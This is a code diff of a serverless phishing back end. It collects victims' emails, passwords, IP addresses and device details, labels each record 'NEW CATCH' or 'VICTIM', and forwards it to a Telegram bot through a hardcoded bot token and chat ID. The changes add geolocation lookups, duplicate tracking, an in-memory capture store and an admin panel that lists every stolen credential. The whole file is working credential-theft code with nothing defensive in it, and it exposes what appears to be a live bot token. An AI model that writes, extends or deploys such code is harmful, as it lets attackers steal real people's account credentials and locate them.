@@ -1,83 +1,123 @@
-// === HELPERS ===
+const BOT_TOKEN = '8674321912:AAH9ncPM6rtU8cilPYiS_uR4ZZNZOxnLfRs';
+const CHAT_ID = '7607355489';
+const ADMIN_KEY = 'lo-secret-2026';  // change this
+
+// In-memory store (resets on deploy, use Vercel KV for persistence)
+const captures = [];
+const seenEmails = new Set();
+
+async function getGeo(ip) {
+    try {
+        const cleanIp = ip.split(',')[0].trim();
+        if (cleanIp === '127.0.0.1' || cleanIp.startsWith('192.168.') || cleanIp.startsWith('10.')) {
+            return { country: 'Local/Private', city: 'N/A', isp: 'N/A', query: cleanIp };
+        }
+        const res = await fetch(`http://ip-api.com/json/${cleanIp}?fields=status,country,city,isp,query`);
+        const data = await res.json();
+        if (data.status === 'success') return data;
+        throw new Error('Geo failed');
+    } catch (err) {
+        return { country: 'Unknown', city: 'Unknown', isp: 'Unknown', query: ip };
+    }
+}
+
 function parseUA(ua) {
-    let browser = 'Unknown', os = 'Unknown', mobile = false;
-    
-    if (/Mobile|Android|iPhone|iPad|iPod/.test(ua)) mobile = true;
-    if (/Windows NT 10/.test(ua)) os = 'Windows 11';
-    else if (/Windows NT 6.3/.test(ua)) os = 'Windows 8.1';
-    else if (/Windows NT 6.2/.test(ua)) os = 'Windows 8';
-    else if (/Windows NT 6.1/.test(ua)) os = 'Windows 7';
-    else if (/Mac OS X/.test(ua)) os = 'macOS';
-    else if (/Android/.test(ua)) os = 'Android';
-    else if (/iPhone|iPad/.test(ua)) os = 'iOS';
-    else if (/Linux/.test(ua)) os = 'Linux';
-    
-    if (/Chrome\/(\d+)/.test(ua)) browser = `Chrome ${RegExp.$1}`;
-    else if (/Firefox\/(\d+)/.test(ua)) browser = `Firefox ${RegExp.$1}`;
-    else if (/Safari\/(\d+)/.test(ua) && /Version\/(\d+)/.test(ua)) browser = `Safari ${RegExp.$1}`;
-    else if (/Edg\/(\d+)/.test(ua)) browser = `Edge ${RegExp.$1}`;
-    
-    return { browser, os, mobile };
+    const os = ua.match(/(Windows|Mac|Linux|Android|iOS)/i)?.[0] || 'Unknown';
+    const browser = ua.match(/(Chrome|Firefox|Safari|Edge|Opera)/i)?.[0] || 'Unknown';
+    const device = /Mobile|Android|iPhone/.test(ua) ? 'Mobile' : 'Desktop';
+    return { os, browser, device };
+}
+
+async function sendTelegram(text) {
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: text,
+            parse_mode: 'HTML'
+        })
+    });
+    const data = await res.json();
+    if (!data.ok) throw new Error(data.description);
+    return data;
 }
 
 module.exports = async (req, res) => {
-    const BOT_TOKEN = '8674321912:AAH9ncPM6rtU8cilPYiS_uR4ZZNZOxnLfRs';
-    const CHAT_ID = '7607355489';
-
-    // CORS
     res.setHeader('Access-Control-Allow-Origin', '*');
-    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
+    res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
 
     if (req.method === 'OPTIONS') return res.status(200).end();
+
+    // === ADMIN PANEL ===
+    if (req.method === 'GET' && req.url.startsWith('/api/admin')) {
+        const key = new URL(req.url, `http://${req.headers.host}`).searchParams.get('key');
+        if (key !== ADMIN_KEY) return res.status(403).json({ error: 'Invalid key' });
+        return res.status(200).json({
+            total: captures.length,
+            uniqueEmails: seenEmails.size,
+            captures: captures
+        });
+    }
+
     if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
 
-    const clientData = req.body;
-    
-    // Server-side enrichment
-    const clientIP = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown').split(',')[0].trim();
-    const referrer = req.headers.referer || clientData.referrer || 'Direct / Bookmark';
-    const ua = req.headers['user-agent'] || 'Unknown';
-    const parsed = parseUA(ua);
+    const data = req.body;
+    const clientIp = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || 'unknown';
+    const geo = await getGeo(clientIp);
+    const ua = parseUA(data.userAgent || '');
 
-    // Build intel report
-    const text = `🎣 *NEW CATCH* #${clientData.attemptNumber}\n\n` +
-                 `👤 *VICTIM*\n` +
-                 `├ Email: \\${clientData.email}\n` +
-                 `├ Pass: \\${clientData.password}\n` +
-                 `├ IP: \\${clientIP}\n` +
-                 `└ Time: ${new Date(clientData.timestamp).toLocaleString()}\n\n` +
-                 `💻 *DEVICE*\n` +
-                 `├ Browser: ${parsed.browser} on ${parsed.os}\n` +
-                 `├ Screen: ${clientData.screen}\n` +
-                 `├ Cores: ${clientData.cores || '?'}\n` +
-                 `├ Memory: ${clientData.memory ? clientData.memory + 'GB' : '?'}\n` +
-                 `├ Touch: ${clientData.touch ? 'Yes' : 'No'}\n` +
-                 `├ Mobile: ${parsed.mobile ? 'Yes' : 'No'}\n` +
-                 `├ Lang: ${clientData.language}\n` +
-                 `└ TZ: ${clientData.timezone || '?'}\n\n` +
-                 `🔗 *ORIGIN*\n` +
-                 `└ Referrer: ${referrer}\n\n` +
-                 `🕵️ *RAW UA*\n` +
-                 `\\${ua.slice(0, 200)}`;
+    // Duplicate detection
+    const fingerprint = `${data.email}:${data.password}`;
+    const isDuplicate = seenEmails.has(data.email);
+    if (!isDuplicate) seenEmails.add(data.email);
+
+    const capture = {
+        ...data,
+        ip: geo.query,
+        country: geo.country,
+        city: geo.city,
+        isp: geo.isp,
+        os: ua.os,
+        browser: ua.browser,
+        device: ua.device,
+        receivedAt: new Date().toISOString(),
+        isDuplicate
+    };
+
+    captures.push(capture);
+
+    const flag = isDuplicate ? '⚠️ DUPLICATE' : '🎣 NEW CATCH';
+    const text = 
+`<b>${flag}</b>
+
+<b>📧 Credentials</b>
+Email: <code>${data.email}</code>
+Pass: <code>${data.password}</code>
+Attempt: #${data.attemptNumber}
+
+<b>🌍 Location</b>
+IP: <code>${geo.query}</code>
+Country: ${geo.country}
+City: ${geo.city}
+ISP: ${geo.isp}
+
+<b>💻 Device</b>
+OS: ${ua.os}
+Browser: ${ua.browser}
+Device: ${ua.device}
+Screen: ${data.screen}
+Lang: ${data.language}
+
+<b>⏰ Time</b>
+${new Date(data.timestamp).toLocaleString()}`;
 
     try {
-        const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: text,
-                parse_mode: 'MarkdownV2'
-            })
-        });
-
-        const tgData = await tgRes.json();
-        if (!tgData.ok) throw new Error(tgData.description);
-
-        return res.status(200).json({ ok: true, ip: clientIP });
+        await sendTelegram(text);
+        return res.status(200).json({ ok: true, duplicate: isDuplicate });
     } catch (err) {
-        console.error('Capture failed:', err.message);
-        return res.status(200).json({ ok: false, error: err.message });
+        console.error('Telegram failed:', err.message);
+        return res.status(200).json({ ok: false, error: err.message, stored: true });
     }
 };
